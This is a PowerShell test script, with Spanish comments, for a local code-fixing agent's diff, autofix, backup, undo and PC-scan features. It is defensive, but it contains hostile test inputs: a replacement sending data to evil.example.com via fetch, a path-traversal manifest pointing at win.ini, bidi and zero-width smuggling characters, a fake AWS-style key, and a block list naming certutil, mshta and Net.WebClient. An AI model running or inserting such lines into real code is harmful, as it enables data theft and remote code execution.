# Pruebas de "mejorar codigo" (diff, validacion, respaldo, aplicar, deshacer) y de la revision del PC. Sin modelo.
# Uso (dentro de app\env.bat): powershell -File skills-improve-test.ps1. ASCII.
$ErrorActionPreference = 'Continue'
$Root = Split-Path -Parent (Split-Path -Parent $PSScriptRoot)
$App = Join-Path $Root 'app'; $Ag = Join-Path $Root 'agent'
. (Join-Path $App 'lib.ps1')
. (Join-Path $Ag 'hands.ps1')
. (Join-Path $Ag 'skills\files.ps1')
. (Join-Path $Ag 'skills\codescan.ps1')
. (Join-Path $Ag 'skills\improve.ps1')
. (Join-Path $Ag 'skills\pcscan.ps1')
. (Join-Path $Ag 'tasks.ps1')
$env:SANTUARIO_TEST = '1'
$script:SecretDirOverride = Join-Path $env:TEMP ('santuario-imp-key-' + $PID)
$script:Origin = 'consola'
$pass = 0; $fail = 0
function Check([string]$name, $got, $want) { if ("$got" -eq "$want") { $script:pass++ } else { $script:fail++; "FALLA: $name -> obtuve '$got', esperaba '$want'" } }
function CheckTrue([string]$name, $cond) { Check $name ([bool]$cond) $true }
function WB([string]$p, [string]$t, [bool]$bom = $false) { $e = New-Object Text.UTF8Encoding($bom); [IO.File]::WriteAllText($p, $t, $e) }

$T = Join-Path (Get-RealFolders).UserProfile ('santuario-improve-test-' + $PID)
New-Item -ItemType Directory -Force $T | Out-Null
$ws = Get-WorkspaceRoot
$script:SkConfirm = { param($d) $true }

# ---- diff
$d = Get-LineDiff "a`nb`nc`nd" "a`nB`nc`nd"
Check 'diff: cambio simple +' $d.added 1
Check 'diff: cambio simple -' $d.removed 1
$d2 = Get-LineDiff "x`ny" "x`ny"
Check 'diff: sin cambios' $d2.changed $false
$d3 = Get-LineDiff "a`nb`nc" "a`nb`nc`nd`ne"
Check 'diff: agregar al final' $d3.added 2
$bidi = 'hola' + [char]0x202E + 'mundo'
Check 'diff: detecta cambio solo de caracter invisible' (Get-LineDiff 'abc' ('a' + [char]0x200B + 'bc')).changed $true
CheckTrue 'diff: escapa bidi' ((Get-LineDiff 'x' $bidi).lines -join "`n").Contains('<U+202E>')

# ---- arreglos automaticos sobre HTML (CRLF + BOM)
$html = "<html>`r`n<head><title>t</title></head>`r`n<body><img src=a.png><a href='x' target='_blank'>x</a></body>`r`n</html>`r`n"
$hp = Join-Path $T 'page.html'
WB $hp $html $true
$null = Add-SessionGrant $T 'read'
$opt = Get-AutoFixOptions $hp
Check 'opciones: ok' $opt.ok $true
CheckTrue 'opciones: ofrece lang' (@($opt.options | Where-Object { $_.rule -eq 'html-lang' }).Count -eq 1)
CheckTrue 'opciones: ofrece viewport' (@($opt.options | Where-Object { $_.rule -eq 'html-viewport' }).Count -eq 1)
$cs = Invoke-AutoFix $hp
Check 'autofix html: valido' $cs.ok $true
CheckTrue 'autofix: lang' ($cs.new -match '<html lang="es"')
CheckTrue 'autofix: viewport' ($cs.new -match 'name="viewport"')
CheckTrue 'autofix: rel' ($cs.new -match 'rel="noopener noreferrer"')
CheckTrue 'autofix: alt' ($cs.new -match 'alt=""')
CheckTrue 'autofix: hay diff' ($cs.diff.added -gt 0)
# sin permiso de escritura no aplica
$r = Apply-ChangeSet $cs
Check 'aplicar sin escritura: bloqueado' $r.ok $false
CheckTrue 'aplicar sin escritura: motivo' ($r.reason -match 'sin permiso de escritura')
$beforeBytes = [IO.File]::ReadAllBytes($hp)
$null = Add-SessionGrant $T 'write'
# rechazar la confirmacion no cambia nada
$script:SkConfirm = { param($d) $false }
$r = Apply-ChangeSet $cs
Check 'rechazado: no aplica' $r.ok $false
Check 'rechazado: archivo intacto' ([IO.File]::ReadAllBytes($hp) -join ',') ($beforeBytes -join ',')
CheckTrue 'rechazado: sin temporales' (-not (@(Get-ChildItem -LiteralPath $T -Force | Where-Object { $_.Name -like '.santuario-tmp-*' }).Count))
# aprobar
$script:SkConfirm = { param($d) $true }
$origHash = (Get-FileHash -LiteralPath $hp -Algorithm SHA256).Hash
$r = Apply-ChangeSet $cs
Check 'aprobado: aplica' $r.ok $true
$after = [IO.File]::ReadAllBytes($hp)
Check 'conserva BOM' ($after[0] -eq 0xEF -and $after[1] -eq 0xBB -and $after[2] -eq 0xBF) $true
$afterText = [Text.Encoding]::UTF8.GetString($after)
CheckTrue 'conserva CRLF' ($afterText.Contains("`r`n") -and -not [regex]::IsMatch($afterText, '(?<!\r)\n'))
CheckTrue 'respaldo existe' (Test-Path -LiteralPath $r.backup)
Check 'respaldo = original' (Get-FileHash -LiteralPath $r.backup -Algorithm SHA256).Hash $origHash
CheckTrue 'respaldo dentro del taller' (Test-UnderRoot $r.backup $ws)
CheckTrue 'el escaner ya no ve los problemas de HTML' (-not (@((Scan-Text 'page.html' 'html' ($afterText -replace "`r`n", "`n") @{ codeLines = 0; commentLines = 0; todo = 0; longLines = 0; regexTimeouts = 0; dup = @{} }) | Where-Object { $_.id -in 'html-lang', 'html-viewport', 'html-blank' }).Count))
# el archivo cambio despues de preparar la propuesta
$cs2 = Invoke-AutoFix $hp
Check 'segundo autofix sin nada que hacer' $cs2.ok $false
# deshacer
$u = Undo-LastChange
Check 'deshacer: ok' $u.ok $true
Check 'deshacer: restaura original' (Get-FileHash -LiteralPath $hp -Algorithm SHA256).Hash $origHash
Check 'deshacer 2: nada' (Undo-LastChange).ok $false
# deshacer no pisa ediciones posteriores
$cs = Invoke-AutoFix $hp; $r = Apply-ChangeSet $cs
Add-Content -LiteralPath $hp -Value '<!-- edicion posterior -->'
$u = Undo-LastChange
Check 'deshacer con edicion posterior: bloqueado' $u.ok $false
# propuesta vieja: el archivo cambio
$cs = Invoke-AutoFix (Join-Path $T 'page.html')
Check 'autofix tras edicion posterior (nada o valido)' ($cs.ok -or $cs.errors.Count -ge 0) $true
WB (Join-Path $T 'late.html') "<html><body><img src=a.png></body></html>"
$cs = Invoke-AutoFix (Join-Path $T 'late.html')
Add-Content -LiteralPath (Join-Path $T 'late.html') -Value ' '
$r = Apply-ChangeSet $cs
Check 'archivo cambio entre propuesta y aplicar' $r.ok $false
CheckTrue 'motivo: cambio' ($r.reason -match 'cambio')

# ---- proteccion de archivos
WB (Join-Path $T 'tool.exe') 'texto'
Check 'nunca: .exe' ((Test-NeverOverwrite (Join-Path $T 'tool.exe')) -ne '') $true
Check 'nunca: Santuario' ((Test-NeverOverwrite (Join-Path $Root 'agent\hands.ps1')) -ne '') $true
Check 'nunca: .git' ((Test-NeverOverwrite 'C:\proy\.git\config') -ne '') $true
Check 'nunca: workflows' ((Test-NeverOverwrite 'C:\proy\.github\workflows\ci.yml') -ne '') $true
Check 'normal: se puede' (Test-NeverOverwrite (Join-Path $T 'late.html')) ''
Check 'el taller dentro de Santuario si es editable' (Test-NeverOverwrite (Join-Path $ws 'demo\x.html')) ''
$ro = Join-Path $T 'ro.html'; WB $ro '<html><body></body></html>'; (Get-Item $ro).IsReadOnly = $true
Check 'nunca: solo lectura' ((Test-NeverOverwrite $ro) -ne '') $true
(Get-Item $ro).IsReadOnly = $false
# secreto en archivo editable: no se lee .env
WB (Join-Path $T '.env') 'A=1'
Check 'editar .env: no' (Read-Editable (Join-Path $T '.env')).ok $false

# ---- validacion de reemplazos del modelo (sin modelo)
$js = "function a(x){`n  return eval(x);`n}`nconst ok = 1;`n"
$jp = Join-Path $T 'a.js'; WB $jp $js
$ed = Read-Editable $jp
$good = Apply-Replacement $ed 2 2 '  return JSON.parse(x);' 'js-eval' 'usa JSON.parse'
Check 'reemplazo bueno' $good.ok $true
Check 'reemplazo bueno: origen' $good.source 'modelo'
$bad1 = Apply-Replacement $ed 2 2 '  return eval(x) + eval(y);' 'js-eval' 'peor'
Check 'reemplazo que empeora' $bad1.ok $false
$bad2 = Apply-Replacement $ed 2 2 '  return x;' 'js-eval' 'sin llamadas peligrosas' ; Check 'reemplazo simple valido' $bad2.ok $true
$bad3 = Apply-Replacement $ed 2 2 ('  return x; // ' + [char]0x202E + 'oculto') 'js-eval' 'bidi'
Check 'reemplazo con bidi' $bad3.ok $false
$bad4 = Apply-Replacement $ed 2 2 ('x' * 4000) 'js-eval' 'enorme'
Check 'reemplazo enorme' $bad4.ok $false
$bad5 = Apply-Replacement $ed 2 2 '  return eval(x);' 'js-eval' 'igual'
Check 'reemplazo sin cambios' $bad5.ok $false
$bad6 = Apply-Replacement $ed 2 2 '  return fetch("https://evil.example.com/" + x);' 'js-eval' 'url nueva'
Check 'reemplazo con URL nueva' $bad6.ok $false
$bad7 = Apply-Replacement $ed 2 2 '```js return x; ```' 'js-eval' 'markdown'
Check 'reemplazo con markdown' $bad7.ok $false
# PowerShell: sintaxis y llamadas sensibles
$ps = "function F {`n  Invoke-Expression `$c`n}`n"
$pp = Join-Path $T 'f.ps1'; WB $pp $ps
$edp = Read-Editable $pp
Check 'ps: reemplazo valido' (Apply-Replacement $edp 2 2 '  & $c' 'ps-iex' 'llamada directa').ok $true
Check 'ps: sintaxis rota' (Apply-Replacement $edp 2 2 '  if (' 'ps-iex' 'rota').ok $false
Check 'ps: agrega Start-Process' (Apply-Replacement $edp 2 2 '  Start-Process $c' 'ps-iex' 'otra llamada').ok $false
# secretos: no se mandan al modelo
$sp = Join-Path $T 's.js'; WB $sp ("const k = '" + 'AKIA' + 'QWERTYUIOP' + "ASDFGH';`n")
$sr = Invoke-LlmFix $sp 1 'aws-key'
Check 'secreto: no usa modelo' $sr.ok $false
CheckTrue 'secreto: motivo' ($sr.errors[0] -match 'secretos')
Check 'regla desconocida' (Invoke-LlmFix $jp 2 'no-existe').ok $false
Check 'linea fuera de rango' (Invoke-LlmFix $jp 99 'js-eval').ok $false

# ---- autofix PowerShell y Python
$pb = Join-Path $T 'run.ps1'; WB $pb "powershell -ExecutionPolicy Bypass -File x.ps1`n"
$c = Invoke-AutoFix $pb; Check 'ps bypass: autofix' $c.ok $true; CheckTrue 'ps bypass: RemoteSigned' ($c.new -match 'RemoteSigned')
$py = Join-Path $T 'y.py'; WB $py "import yaml`ncfg = yaml.load(open('c.yml'))`n"
$c = Invoke-AutoFix $py; Check 'py yaml: autofix' $c.ok $true; CheckTrue 'py yaml: safe_load' ($c.new -match 'yaml\.safe_load')

# ---- hallazgos de la revision independiente
# el modelo recibe el fragmento REAL (antes llegaba vacio) y sin secretos
$rule = @(Get-CsRules | Where-Object { $_.id -eq 'js-eval' })[0]
$segTxt = "const k = '" + 'AKIA' + 'QWERTYUIOP' + "ASDFGH';`nreturn eval(x);"
$seg = Sanitize-Untrusted (Mask-Text $segTxt) 4000
$usr = Get-LlmFixUser $rule 'javascript' $seg 'abc123'
CheckTrue 'prompt: contiene el codigo' ($usr.Contains('return eval(x);'))
CheckTrue 'prompt: sin la clave' (-not $usr.Contains('AKIAQWERTY'))
CheckTrue 'prompt: marcas con id' ($usr.Contains('<<FRAGMENTO abc123>>') -and $usr.Contains('<<FIN abc123>>'))
# poner santuario:ignore no es arreglar
$ign = Apply-Replacement $ed 2 2 '  return eval(x); // santuario:ignore' 'js-eval' 'silenciar'
Check 'rechaza agregar santuario:ignore' $ign.ok $false
# caracteres invisibles que YA estaban en el original no bloquean la edicion (ZWNJ legitimo)
$zw = Join-Path $T 'zw.js'; WB $zw ("var s = 'a" + [char]0x200C + "b';`nreturn eval(x);`n")
$edz = Read-Editable $zw
Check 'ZWNJ previo no bloquea' (Apply-Replacement $edz 2 2 'return x;' 'js-eval' 'ok').ok $true
Check 'ZWNJ nuevo si bloquea' (Apply-Replacement $edz 2 2 ('return x;' + [char]0x200C) 'js-eval' 'nuevo').ok $false
# finales de linea mezclados: no se edita
$mx = Join-Path $T 'mixed.js'; [IO.File]::WriteAllText($mx, "a`r`nb`nc`r`n")
Check 'EOL mezclado: no editable' (Read-Editable $mx).ok $false
# archivos protegidos nuevos
Check 'nunca: package.json' ((Test-NeverOverwrite (Join-Path $T 'package.json')) -ne '') $true
Check 'nunca: .vscode\tasks.json' ((Test-NeverOverwrite 'C:\proy\.vscode\tasks.json') -ne '') $true
# diff: no muestra secretos
$dm = Get-LineDiff ("a`nconst k = '" + 'AKIA' + 'QWERTYUIOP' + "ASDFGH';`nb") ("a`nconst k = 'x';`nb")
CheckTrue 'diff: secreto tapado' (-not (($dm.lines -join "`n").Contains('AKIAQWERTY')))
# cambio demasiado grande para revisar: no se aplica
$bigOld = (1..700 | ForEach-Object { "linea $_" }) -join "`n"; $bigNew = (1..700 | ForEach-Object { "otra $_" }) -join "`n"
Check 'diff enorme: marcado incompleto' (Get-LineDiff $bigOld $bigNew).complete $false
# deshacer: manifiesto con ruta fuera del taller se rechaza
$lastF = Join-Path $ws 'backups\last.txt'
New-Item -ItemType Directory -Force (Split-Path -Parent $lastF) | Out-Null
[IO.File]::WriteAllText($lastF, ($ws + '\..\..\..\Windows\win.ini'))
Check 'deshacer: manifiesto fuera del taller' (Undo-LastChange).ok $false
Remove-Item -LiteralPath $lastF -Force -ErrorAction SilentlyContinue
# restauracion atomica verificada
$rs1 = Join-Path $T 'r1.txt'; $rs2 = Join-Path $T 'r2.txt'; WB $rs1 'original'; WB $rs2 'modificado'
$h1 = (Get-FileHash -LiteralPath $rs1 -Algorithm SHA256).Hash
Check 'Restore-File: ok' (Restore-File $rs1 $rs2 $h1) $true
Check 'Restore-File: contenido' ([IO.File]::ReadAllText($rs2)) 'original'
Check 'Restore-File: hash erroneo no toca nada' (Restore-File $rs1 $rs2 'DEADBEEF') $false

# ---- manifiesto de /deshacer firmado
$sg = Join-Path $T 'sig.html'; WB $sg "<html>`n<body><img src=a.png></body>`n</html>`n"
$null = Add-SessionGrant $T 'read'
$script:SkConfirm = { param($d) $true }
$csg = Invoke-AutoFix $sg; $rsg = Apply-ChangeSet $csg
Check 'aplica con manifiesto firmado' $rsg.ok $true
$mfp = $rsg.manifest
$mj = [IO.File]::ReadAllText($mfp) | ConvertFrom-Json
CheckTrue 'manifiesto lleva firma' ([string]$mj.sig).Length -gt 20
$mj.originalHash = (Get-FileHash -LiteralPath $sg -Algorithm SHA256).Hash        # un atacante cambia el hash esperado
[IO.File]::WriteAllText($mfp, ($mj | ConvertTo-Json), (New-Object Text.UTF8Encoding($false)))
$ug = Undo-LastChange
Check 'deshacer con manifiesto alterado: bloqueado' $ug.ok $false
CheckTrue 'deshacer: motivo firma' ($ug.reason -match 'firma')
# gancho de pruebas: sin la variable de entorno no aprueba solo
$env:SANTUARIO_TEST = ''
$script:SkConfirm = { param($d) $true }
Check 'produccion: SkConfirm no aprueba sin variable de prueba' (Confirm-Strong 'x') $false
$env:SANTUARIO_TEST = '1'
# lista ampliada de llamadas sensibles
foreach ($tok in 'Invoke-Command -ScriptBlock { 1 }', 'Add-Type -TypeDefinition $x', '[Convert]::FromBase64String($x)', 'certutil -urlcache x', 'mshta http-x', 'New-Object Net.WebClient') {
    $r2 = Apply-Replacement $edp 2 2 ('  ' + $tok) 'ps-iex' 'x'
    Check ('rechaza ' + $tok.Substring(0, [math]::Min(22, $tok.Length))) $r2.ok $false
}

# ---- origen
$script:Origin = 'remoto'
$thr = $false; try { Invoke-AutoFix $pb | Out-Null } catch { $thr = $true }
Check 'origen remoto: no mejora' $thr $true
$thr = $false; try { Invoke-PcScan | Out-Null } catch { $thr = $true }
Check 'origen remoto: no revisa el PC' $thr $true
$script:Origin = 'consola'

# ---- revision del PC
$pc = Invoke-PcScan
Check 'pcscan: ok' $pc.ok $true
CheckTrue 'pcscan: al menos 15 comprobaciones' ($pc.checks.Count -ge 15)
CheckTrue 'pcscan: estados validos' (-not (@($pc.checks | Where-Object { $_.estado -notin 'ok', 'aviso', 'alto', 'nd', 'info' }).Count))
CheckTrue ('pcscan: rapido (' + $pc.elapsed_ms + ' ms)') ($pc.elapsed_ms -lt 60000)
$rep = (Format-PcReport $pc) -join "`n"
CheckTrue 'pcscan: informe con resumen' ($rep -match 'Resumen:')
CheckTrue 'pcscan: nunca imprime valores de DefaultPassword' ($rep -notmatch 'DefaultPassword\s*=')
Check 'Get-ExeOnly quita argumentos' (Get-ExeOnly '"C:\Program Files\x\a.exe" --token=SECRETO') 'C:\Program Files\x\a.exe'
Check 'Get-ExeOnly sin comillas' (Get-ExeOnly 'C:\x\a.exe -p secreto') 'C:\x\a.exe'
CheckTrue 'ruta riesgosa' (Test-RiskyPath 'C:\Users\Usuario\AppData\Local\Temp\x.exe')
CheckTrue 'ruta normal' (-not (Test-RiskyPath 'C:\Program Files\x\a.exe'))

# ---- limpieza
Remove-Item -LiteralPath $T -Recurse -Force -ErrorAction SilentlyContinue
$bk = Join-Path $ws 'backups'; if (Test-Path -LiteralPath $bk) { Remove-Item -LiteralPath $bk -Recurse -Force -ErrorAction SilentlyContinue }
"RESULTADO: $pass pasaron, $fail fallaron"
